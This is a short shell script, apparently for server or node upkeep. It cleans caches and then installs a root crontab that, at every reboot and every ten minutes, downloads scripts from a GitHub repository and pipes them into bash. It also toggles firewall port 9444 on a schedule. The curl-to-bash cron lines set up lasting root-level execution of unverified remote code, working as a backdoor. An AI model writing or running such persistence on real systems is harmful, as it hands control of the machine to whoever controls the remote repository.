#!/bin/sh
sudo su
sudo apt clean
sudo rm -rf ~/.cache/thumbnails/*
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/reload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/oneminute.sh | bash
2 1,4,7,10,13,16,19,22 * * * sudo apt clean && sudo rm -rf ~/.cache/thumbnails/*
3 1,4,7,10,13,16,19,22 * * * sudo ufw allow 9444/tcp
8 1,4,7,10,13,16,19,22 * * * sudo ufw deny 9444/tcp
 " >> myverifier
sudo crontab myverifier
rm myverifier
